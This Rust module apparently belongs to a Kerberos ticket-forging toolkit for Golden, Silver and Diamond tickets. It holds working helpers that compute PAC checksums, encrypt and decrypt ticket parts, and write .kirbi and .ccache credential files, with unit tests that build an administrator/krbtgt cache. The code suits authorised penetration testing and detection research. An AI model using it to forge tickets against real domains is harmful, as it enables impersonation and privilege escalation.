//! Ticket forging: Golden, Silver, Diamond — shared crypto helpers.
//!
//! Provides centralised routines for:
//! - PAC checksum computation (HMAC-MD5 for RC4, HMAC-SHA1-96 for AES)
//! - Ticket encryption/decryption dispatching by etype
//! - Kirbi (`.kirbi`) file encoding/decoding
//! - Key type detection and validation

use anyhow::{Result, bail};

use super::aes_cts;
use super::hmac_util;
use super::rc4_util;

// ═══════════════════════════════════════════════════════════
// Kerberos Constants
// ═══════════════════════════════════════════════════════════

/// Kerberos etype 23: RC4-HMAC-MD5
pub const ETYPE_RC4_HMAC: i32 = 23;
/// Kerberos etype 17: AES128-CTS-HMAC-SHA1-96
pub const ETYPE_AES128_CTS: i32 = 17;
/// Kerberos etype 18: AES256-CTS-HMAC-SHA1-96
pub const ETYPE_AES256_CTS: i32 = 18;

/// PAC checksum type for RC4-HMAC (KERB_CHECKSUM_HMAC_MD5)
pub const CHECKSUM_HMAC_MD5: i32 = -138;
/// PAC checksum type for HMAC-SHA1-96-AES-128
pub const CHECKSUM_HMAC_SHA1_96_AES128: i32 = 15;
/// PAC checksum type for HMAC-SHA1-96-AES-256
pub const CHECKSUM_HMAC_SHA1_96_AES256: i32 = 16;

// ═══════════════════════════════════════════════════════════
// PAC Checksum
// ═══════════════════════════════════════════════════════════

/// Compute a PAC checksum for the given etype.
///
/// Returns `(checksum_type_le32 || checksum_bytes)` — the format used in
/// `PAC_SIGNATURE_DATA`.
///
/// - etype 23 (RC4-HMAC): `HMAC-MD5(key, data)` → 16-byte checksum, type -138.
/// - etype 17 (AES-128):  `HMAC-SHA1-96(key, data)` → 12-byte checksum, type 15.
/// - etype 18 (AES-256):  `HMAC-SHA1-96(key, data)` → 12-byte checksum, type 16.
pub fn compute_pac_checksum(etype: i32, key: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    let mut result = Vec::new();

    match etype {
        ETYPE_RC4_HMAC => {
            result.extend_from_slice(&CHECKSUM_HMAC_MD5.to_le_bytes());
            let checksum = hmac_util::hmac_md5(key, data);
            result.extend_from_slice(&checksum);
        }
        ETYPE_AES128_CTS => {
            result.extend_from_slice(&CHECKSUM_HMAC_SHA1_96_AES128.to_le_bytes());
            let checksum = hmac_util::hmac_sha1_96_aes(key, data);
            result.extend_from_slice(&checksum);
        }
        ETYPE_AES256_CTS => {
            result.extend_from_slice(&CHECKSUM_HMAC_SHA1_96_AES256.to_le_bytes());
            let checksum = hmac_util::hmac_sha1_96_aes(key, data);
            result.extend_from_slice(&checksum);
        }
        _ => bail!("Unsupported etype for PAC checksum: {etype}"),
    }

    Ok(result)
}

/// Compute the raw PAC checksum bytes (without the type prefix).
///
/// Useful when you want just the checksum value for PAC_SIGNATURE_DATA fields.
pub fn compute_pac_checksum_raw(etype: i32, key: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    match etype {
        ETYPE_RC4_HMAC => Ok(hmac_util::hmac_md5(key, data).to_vec()),
        ETYPE_AES128_CTS | ETYPE_AES256_CTS => Ok(hmac_util::hmac_sha1_96_aes(key, data).to_vec()),
        _ => bail!("Unsupported etype: {etype}"),
    }
}

/// Get the PAC checksum type for a given etype.
pub fn checksum_type_for_etype(etype: i32) -> Result<i32> {
    match etype {
        ETYPE_RC4_HMAC => Ok(CHECKSUM_HMAC_MD5),
        ETYPE_AES128_CTS => Ok(CHECKSUM_HMAC_SHA1_96_AES128),
        ETYPE_AES256_CTS => Ok(CHECKSUM_HMAC_SHA1_96_AES256),
        _ => bail!("Unsupported etype: {etype}"),
    }
}

// ═══════════════════════════════════════════════════════════
// Ticket Part Encryption / Decryption
// ═══════════════════════════════════════════════════════════

/// Encrypt a Kerberos ticket part (EncTicketPart, EncTGSRepPart, etc.)
/// using the appropriate cipher for the given etype.
///
/// - etype 23: RC4-HMAC with key_usage
/// - etype 17: AES-128-CTS
/// - etype 18: AES-256-CTS
pub fn encrypt_ticket_part(
    etype: i32,
    key: &[u8],
    plaintext: &[u8],
    key_usage: i32,
) -> Result<Vec<u8>> {
    match etype {
        ETYPE_RC4_HMAC => Ok(rc4_util::rc4_hmac_encrypt(key, plaintext, key_usage)),
        ETYPE_AES128_CTS => aes_cts::aes128_cts_encrypt(key, plaintext),
        ETYPE_AES256_CTS => aes_cts::aes256_cts_encrypt(key, plaintext),
        _ => bail!("Unsupported etype for ticket encryption: {etype}"),
    }
}

/// Decrypt a Kerberos ticket part using the appropriate cipher.
pub fn decrypt_ticket_part(
    etype: i32,
    key: &[u8],
    ciphertext: &[u8],
    key_usage: i32,
) -> Result<Vec<u8>> {
    match etype {
        ETYPE_RC4_HMAC => rc4_util::rc4_hmac_decrypt(key, ciphertext, key_usage),
        ETYPE_AES128_CTS => aes_cts::aes128_cts_decrypt(key, ciphertext),
        ETYPE_AES256_CTS => aes_cts::aes256_cts_decrypt(key, ciphertext),
        _ => bail!("Unsupported etype for ticket decryption: {etype}"),
    }
}

// ═══════════════════════════════════════════════════════════
// Key Utilities
// ═══════════════════════════════════════════════════════════

/// Detect the etype from key length.
///
/// - 16 bytes → etype 23 (RC4-HMAC / NTLM hash)
/// - 32 bytes → etype 18 (AES-256)
/// - Other → error
pub fn detect_etype_from_key(key: &[u8]) -> Result<i32> {
    match key.len() {
        16 => Ok(ETYPE_RC4_HMAC),
        32 => Ok(ETYPE_AES256_CTS),
        _ => bail!("Cannot detect etype from key length {}", key.len()),
    }
}

/// Validate that a key is the correct length for the given etype.
pub fn validate_key_for_etype(key: &[u8], etype: i32) -> Result<()> {
    let expected = expected_key_length(etype)?;
    if key.len() != expected {
        bail!(
            "Key length {} does not match etype {} (expected {})",
            key.len(),
            etype,
            expected
        );
    }
    Ok(())
}

/// Expected key length for a given etype.
pub fn expected_key_length(etype: i32) -> Result<usize> {
    match etype {
        ETYPE_RC4_HMAC => Ok(16),
        ETYPE_AES128_CTS => Ok(16),
        ETYPE_AES256_CTS => Ok(32),
        _ => bail!("Unknown etype: {etype}"),
    }
}

/// Human-readable name for an etype.
pub fn etype_name(etype: i32) -> &'static str {
    match etype {
        ETYPE_RC4_HMAC => "RC4-HMAC",
        ETYPE_AES128_CTS => "AES128-CTS-HMAC-SHA1-96",
        ETYPE_AES256_CTS => "AES256-CTS-HMAC-SHA1-96",
        _ => "unknown",
    }
}

// ═══════════════════════════════════════════════════════════
// Kirbi (`.kirbi`) File Encoding
// ═══════════════════════════════════════════════════════════

/// Encode raw KRB-CRED bytes into Base64 `.kirbi` format.
///
/// A `.kirbi` file is the Base64 encoding of the ASN.1 DER-encoded KRB-CRED
/// structure, used by tools like Rubeus and Mimikatz.
pub fn build_kirbi(krb_cred_der: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD.encode(krb_cred_der)
}

/// Decode a `.kirbi` file (Base64-encoded KRB-CRED) into raw DER bytes.
pub fn decode_kirbi(kirbi_b64: &str) -> Result<Vec<u8>> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD
        .decode(kirbi_b64.trim())
        .map_err(|e| anyhow::anyhow!("Invalid kirbi base64: {e}"))
}

/// Write a `.kirbi` file (raw KRB-CRED DER → Base64 → file).
pub fn write_kirbi_file(path: &std::path::Path, krb_cred_der: &[u8]) -> Result<()> {
    let kirbi = build_kirbi(krb_cred_der);
    std::fs::write(path, kirbi)?;
    Ok(())
}

/// Read a `.kirbi` file and return the raw KRB-CRED DER bytes.
pub fn read_kirbi_file(path: &std::path::Path) -> Result<Vec<u8>> {
    let contents = std::fs::read_to_string(path)?;
    decode_kirbi(&contents)
}

/// Encode raw ticket data into a `.ccache` (MIT Kerberos credential cache) format.
///
/// This is a simplified ccache builder for a single ticket.
#[allow(clippy::too_many_arguments)]
pub fn build_ccache(
    client_principal: &str,
    server_principal: &str,
    realm: &str,
    key: &[u8],
    etype: i32,
    ticket_der: &[u8],
    start_time: u32,
    end_time: u32,
) -> Vec<u8> {
    let mut ccache = Vec::new();

    // File format version (0x0504 = version 4)
    ccache.extend_from_slice(&[0x05, 0x04]);
    // Header length (0 — no tags)
    ccache.extend_from_slice(&0u16.to_be_bytes());

    // Default principal
    write_ccache_principal(&mut ccache, client_principal, realm);

    // Credential entry
    // Client principal
    write_ccache_principal(&mut ccache, client_principal, realm);
    // Server principal
    write_ccache_principal(&mut ccache, server_principal, realm);
    // Key
    ccache.extend_from_slice(&(etype as u16).to_be_bytes());
    ccache.extend_from_slice(&(key.len() as u16).to_be_bytes());
    ccache.extend_from_slice(key);
    // Times: auth, start, end, renew_till
    ccache.extend_from_slice(&start_time.to_be_bytes());
    ccache.extend_from_slice(&start_time.to_be_bytes());
    ccache.extend_from_slice(&end_time.to_be_bytes());
    ccache.extend_from_slice(&end_time.to_be_bytes());
    // is_skey, ticket_flags
    ccache.push(0); // is_skey
    ccache.extend_from_slice(&0u32.to_be_bytes()); // flags
    // Addresses (0)
    ccache.extend_from_slice(&0u32.to_be_bytes());
    // AuthData (0)
    ccache.extend_from_slice(&0u32.to_be_bytes());
    // Ticket
    ccache.extend_from_slice(&(ticket_der.len() as u32).to_be_bytes());
    ccache.extend_from_slice(ticket_der);
    // Second ticket (0)
    ccache.extend_from_slice(&0u32.to_be_bytes());

    ccache
}

/// Helper to write a principal to ccache format.
fn write_ccache_principal(buf: &mut Vec<u8>, principal: &str, realm: &str) {
    let components: Vec<&str> = principal.split('/').collect();
    // Name type = NT_PRINCIPAL (1)
    buf.extend_from_slice(&1u32.to_be_bytes());
    // Number of components
    buf.extend_from_slice(&(components.len() as u32).to_be_bytes());
    // Realm
    buf.extend_from_slice(&(realm.len() as u32).to_be_bytes());
    buf.extend_from_slice(realm.as_bytes());
    // Components
    for comp in &components {
        buf.extend_from_slice(&(comp.len() as u32).to_be_bytes());
        buf.extend_from_slice(comp.as_bytes());
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pac_checksum_rc4() {
        let key = [0xaa; 16];
        let data = b"test PAC data";
        let result = compute_pac_checksum(ETYPE_RC4_HMAC, &key, data).unwrap();
        // First 4 bytes = checksum type (-138 = 0xFFFFFF76)
        assert_eq!(&result[..4], &CHECKSUM_HMAC_MD5.to_le_bytes());
        // Remaining = 16-byte HMAC-MD5
        assert_eq!(result.len(), 4 + 16);
    }

    #[test]
    fn test_pac_checksum_aes256() {
        let key = [0xbb; 32];
        let data = b"test PAC data";
        let result = compute_pac_checksum(ETYPE_AES256_CTS, &key, data).unwrap();
        // First 4 bytes = checksum type 16
        assert_eq!(&result[..4], &CHECKSUM_HMAC_SHA1_96_AES256.to_le_bytes());
        // Remaining = 12-byte HMAC-SHA1-96
        assert_eq!(result.len(), 4 + 12);
    }

    #[test]
    fn test_pac_checksum_aes128() {
        let key = [0xcc; 16];
        let data = b"test PAC data";
        let result = compute_pac_checksum(ETYPE_AES128_CTS, &key, data).unwrap();
        assert_eq!(&result[..4], &CHECKSUM_HMAC_SHA1_96_AES128.to_le_bytes());
        assert_eq!(result.len(), 4 + 12);
    }

    #[test]
    fn test_encrypt_decrypt_ticket_rc4() {
        let key = [0xdd; 16];
        let plaintext = b"EncTicketPart DER data for RC4 test";
        let ct = encrypt_ticket_part(ETYPE_RC4_HMAC, &key, plaintext, 2).unwrap();
        let pt = decrypt_ticket_part(ETYPE_RC4_HMAC, &key, &ct, 2).unwrap();
        assert_eq!(pt, plaintext);
    }

    #[test]
    fn test_encrypt_decrypt_ticket_aes256() {
        let key = [0xee; 32];
        let plaintext = b"EncTicketPart DER data for AES256 test!";
        let ct = encrypt_ticket_part(ETYPE_AES256_CTS, &key, plaintext, 2).unwrap();
        let pt = decrypt_ticket_part(ETYPE_AES256_CTS, &key, &ct, 2).unwrap();
        assert_eq!(pt, plaintext);
    }

    #[test]
    fn test_detect_etype() {
        assert_eq!(detect_etype_from_key(&[0; 16]).unwrap(), ETYPE_RC4_HMAC);
        assert_eq!(detect_etype_from_key(&[0; 32]).unwrap(), ETYPE_AES256_CTS);
        assert!(detect_etype_from_key(&[0; 24]).is_err());
    }

    #[test]
    fn test_validate_key_for_etype() {
        assert!(validate_key_for_etype(&[0; 16], ETYPE_RC4_HMAC).is_ok());
        assert!(validate_key_for_etype(&[0; 32], ETYPE_AES256_CTS).is_ok());
        assert!(validate_key_for_etype(&[0; 16], ETYPE_AES256_CTS).is_err());
    }

    #[test]
    fn test_kirbi_roundtrip() {
        let fake_krb_cred = vec![0x30, 0x82, 0x01, 0x00, 0xAA, 0xBB, 0xCC]; // Fake DER
        let b64 = build_kirbi(&fake_krb_cred);
        let decoded = decode_kirbi(&b64).unwrap();
        assert_eq!(decoded, fake_krb_cred);
    }

    #[test]
    fn test_etype_name() {
        assert_eq!(etype_name(ETYPE_RC4_HMAC), "RC4-HMAC");
        assert_eq!(etype_name(ETYPE_AES256_CTS), "AES256-CTS-HMAC-SHA1-96");
        assert_eq!(etype_name(ETYPE_AES128_CTS), "AES128-CTS-HMAC-SHA1-96");
        assert_eq!(etype_name(99), "unknown");
    }

    #[test]
    fn test_build_ccache() {
        let ccache = build_ccache(
            "administrator",
            "krbtgt/CONTOSO.COM",
            "CONTOSO.COM",
            &[0xaa; 16],
            ETYPE_RC4_HMAC,
            &[0x30, 0x82], // fake ticket DER
            1000000,
            2000000,
        );
        // Verify file header
        assert_eq!(ccache[0], 0x05);
        assert_eq!(ccache[1], 0x04);
        assert!(ccache.len() > 20); // Should have substantial content
    }
}
